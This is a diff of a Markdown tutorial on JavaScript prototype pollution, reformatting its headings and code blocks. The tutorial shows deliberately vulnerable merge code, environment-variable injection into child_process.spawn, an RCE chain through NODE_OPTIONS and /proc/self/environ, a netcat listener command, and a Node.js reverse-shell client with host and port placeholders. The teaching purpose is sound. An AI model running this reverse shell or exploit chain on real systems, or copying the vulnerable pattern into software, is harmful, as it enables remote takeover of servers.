@@ -80,7 +80,7 @@ JavaScript runtimes look for critical properties higher up in the chain of proto
 
 In the following example, the ```isAdmin``` property isn't set when certain conditions are not met (in the badly written middleware). This opens up a door for exploiting a successful prototype pollution. If the object prototype is somehow polluted to set the ```isAdmin``` as ```true```, an adversary could successfully access the critical endpoint with admin privileges. Compare that to the well-written middleware, which explicitly sets the property as false when check fails. In that case, even if the prototype is polluted, the _**Own Property**_ of the object is going to be considered during the critical endpoint access.
 
-### Example of objects without critical _**Own Properties**_
+#### Example of objects without critical _**Own Properties**_
 ```javascript
 // BADLY WRITTEN MIDDLEWARE
 app.use((req, res, next) => {
@@ -120,12 +120,13 @@ app.route('/critical', (req, res) => {
 })
 ```
 
-Insecure merge / copy or setting properties insecurely
+### Insecure merge / copy of objects or setting properties insecurely
 
 Prototype pollution occurs most of times in places where insecure merging of two objects or copying takes place. The other examples where prototype pollution can occur are libraries which set properties on an object with random keys, not checking whether it's manipulating the prototype or not.
 
 An example piece of code that is vulnerable to prototype pollution is shown below:
 
+```javascript
 function isObject(obj) {
     console.log(typeof obj);
     return typeof obj === 'function' || typeof obj === 'object';
@@ -149,13 +150,13 @@ function clone(target) {
 
 // Run prototype pollution with user input
 clone(USERINPUT);
+```
 
-
-Exploitation Techniques Using Prototype Pollution
-Injecting Environment Variables
+## Exploitation Techniques Using Prototype Pollution
+### Injecting Environment Variables
 
 Consider a JavaScript code as follows:
-
+```javascript
 const { spawn } = require('child_process');
 const ls = spawn('ls', ['-lh', '/usr']);
 
@@ -170,11 +171,12 @@ ls.stderr.on('data', (data) => {
 ls.on('close', (code) => {
   console.log(`child process exited with code ${code}`);
 });
+```
 
-The above program is very simple to understand. It simply spawns a new process with the given command (ls -lh /usr) in this case and dumps the output of the child process into the console of the parent process. When executed, the output, as expected, will be a list of the content of the /usr directory.
+The above program is very simple to understand. It simply spawns a new process with the given command (```ls -lh /usr```) in this case and dumps the output of the child process into the console of the parent process. When executed, the output, as expected, will be a list of the content of the ```/usr``` directory.
 
-From the official documentation, there is a way to pass environment variables to the child process. To verify that the environment variables are indeed being passed into the child process, we will fork a new process with the printenv command, which will list down all environment variables available from the child process into the parent process's console. So the next code looks like as follows:
-
+From the [official documentation](https://nodejs.org/api/child_process.html#child_processspawncommand-args-options), there is a way to pass environment variables to the child process. To verify that the environment variables are indeed being passed into the child process, we will fork a new process with the ```printenv``` command, which will list down all environment variables available from the child process into the parent process's console. So the next code looks like as follows:
+```javascript
 const { spawn } = require('child_process');
 const ls = spawn('printenv', [], { env: { ENVAR: 'testValue-foo' } });
 
@@ -193,11 +195,12 @@ ls.on('close', (code) => {
 //////// OUTPUT ////////
 // stdout: ENVAR=testValue-foo
 // child process exited with code 0
+```
+The signature of the spawn function is ```child_process.spawn(command[, args][, options])```. This is interesting because if we simply call ```spawn``` without any ```options``` argument set, the ```env``` attribute in ```options``` object isn't available to the runtime by default. Which means if we can pollute the object's prototype object by setting an ```env``` attribute in it, the polluted environment variables will be passed down to the forked process inside ```child_process``` module.
 
-The signature of the spawn function is child_process.spawn(command[, args][, options]). This is interesting because if we simply call spawn without any options argument set, the env attribute isn't available by default. Which means if we can pollute the object's prototype object by setting an env attribute in it, the polluted environment variables will be passed down to the forked process inside child_process module.
+The following JS code, when executed, confirms that the polluted environment variable object (```env```) is passed into the forked child process as environment variables. This can also be confirmed from the ```child_process``` module's [source code](https://github.com/nodejs/node/blob/main/lib/child_process.js#L650).
 
-The following JS code, when executed, confirms that the polluted environment variable object (env) is passed into the forked child process as environment variables. This can also be theoretically deduced from the child_process module's source code.
-
+```javascript
 // Pollute prototype with env
 let object = {};
 object.__proto__.env = { ENVAR: 'testValue-foo' };
@@ -221,22 +224,33 @@ ls.on('close', (code) => {
 // stdout: ENVAR=testValue-foo
 // env=[object Object]
 // child process exited with code 0
+```
 
-RCE from Injected Environment Variables
+### RCE from Injected Environment Variables
 
 In the above section, we managed to inject environment variables into a child process through prototype pollution. Now we're going to look at how to execute arbitrary commands leveraging the previous technique.
 
-Before we begin, here's a fundamental fact about Linux. For any process executing in Linux, its environment variables are stored in the /proc/${PID}/environ file where ${PID} is the process ID of that process. Any process can read its own environment variables by reading the /proc/self/environ file. Here, self indicates the currently executing process and is inferred by the kernel.
+Before we begin, here's a fundamental fact about Linux. For any process executing in Linux, its environment variables are stored in the ```/proc/${PID}/environ``` file where ```${PID}``` is the process ID of that process. Any process can read its own environment variables by reading the ```/proc/self/environ``` file. Here, ```self``` indicates the currently executing process and is inferred by the kernel.
 
+#### Reading ```/proc/self/environ```
+```javascript
 root@96901c2d0cb1:~# cat /proc/self/environ
 HOSTNAME=96901c2d0cb1PWD=/rootHOME=/rootLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:TERM=xtermSHLVL=1PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binOLDPWD=/_=/usr/bin/cat
+```
 
-In Node.js, the NODE_OPTIONS environment variable is used to specify command line arguments to the node program. For example, the command $> node --require foo.js is equivalent to $> NODE_OPTIONS='--require foo.js' node.
+#### A couple of important facts before we proceed
+> In Node.js, the ```NODE_OPTIONS``` environment variable is used to specify command line arguments to the ```node``` program. For example, the command ```$> node --require foo.js``` is equivalent to ```$> NODE_OPTIONS='--require foo.js' node```.
 
-Also, the --require argument is used by node to include a JavaScript file and execute it at the very beginning before starting the REPL shell. Remember, --eval argument isn't allowed inside NODE_OPTIONS so we cannot achieve a direct RCE through that.
+>The ```--require``` argument is used by ```node``` to include a JavaScript file and execute it at the very beginning before starting the REPL shell. Remember, ```--eval``` argument isn't allowed inside ```NODE_OPTIONS``` so we cannot achieve a direct code execution by doing that.
 
-Given the above two facts, what happens if we do --require /proc/self/environ? Obviously, the content of /proc/self/environ isn't a valid JavaScript code. Therefore, the Node.js runtime would show an error during startup before displaying the REPL console. However, it we inject another environment variable (say RANDOM) before NODE_OPTIONS with the value 'console.log(123)//', the final content of /proc/self/environ becomes RANDOM=console.log(123)//NODE_OPTIONS=–require /proc/self/environUSER=foo..., which is a valid JavaScript as anything after the double slash is considered as a comment by the runtime. Therefore, we should be able to see the executed JavaScript code and its output (123) in the Node.js console before REPL console starts.
+Given the above two facts, what happens if we do ```--require /proc/self/environ```? Obviously, the content of ```/proc/self/environ``` isn't a valid JavaScript code. Therefore, the Node.js runtime would show an error during startup before displaying the REPL console. However, it we inject another environment variable (say ```RANDOM```) before ```NODE_OPTIONS``` with the value ```console.log(123)//```, the final content of ```/proc/self/environ``` becomes
+```javascript
+RANDOM=console.log(123)//NODE_OPTIONS=–require /proc/self/environUSER=foo...
+```
+Now, this is a valid JavaScript as anything after the double slash is considered as a comment by the runtime. Therefore, we should be able to see the executed JavaScript code and its output (```123```) in the Node.js console before REPL console starts.
 
+#### Executing JavaScript through environment variables
+```bash
 $> RANDOM='console.log(123)//' cat /proc/self/environ
 RANDOM=console.log(123)//HOSTNAME=96901c2d0cb1PWD=/rootHOME=/rootLS_COLORS=rs=0:di=01...
 
@@ -248,9 +262,12 @@ $> RANDOM='console.log(123)//' NODE_OPTIONS='--require /proc/self/environ' node
 Welcome to Node.js v12.22.9.
 Type ".help" for more information.
 > .exit
+```
 
-Since we can execute arbitrary JavaScript code by injecting environment variables, let's write a JavaScript exploit that gives us a reverse shell through Netcat. For doing this, we can start by making Netcat, in a server, listen to some port (say 4444) through the nc -lvp 4444 command. Then we need to write a JavaScript code that acts as a Netcat client and gives us a complete reverse shell. The following code is a good exploit candidate:
+Since we can execute arbitrary JavaScript code by injecting environment variables, let's write a JavaScript code exploit that gives us a reverse shell through Netcat. For doing this, we can start by making Netcat, in a publicly available server, listen to some port (say ```4444```) through the ```nc -lvp 4444``` command. Then we need to write a JavaScript code that acts as a Netcat client and gives us a complete reverse shell. The following code is a good exploit candidate:
 
+#### JavaScript Netcat Client Exploit
+```javascript
 // Replace {{HOST}} and {{PORT}} with your netcat host and port details
 (function(){
     var net = require("net"),
@@ -264,8 +281,9 @@ Since we can execute arbitrary JavaScript code by injecting environment variable
     });
     return /a/;
 })();
+```
 
-We can replace the HOST and PORT details in the above code and encode the entire exploit into hexadecimal format. Doing so, would allow us to easily deliver the exploit to the remote target.
+We can replace the ```HOST``` and ```PORT``` details in the above code and encode the entire exploit into hexadecimal format. Doing so, would allow us to easily deliver the exploit to the remote target.
 
 The following Python code takes care of replacing the details, taken through command line arguments, encode the exploit payload into hexadecimal and output the value that needs to be placed in the first environment variable to execute the exploit on remote target.
 
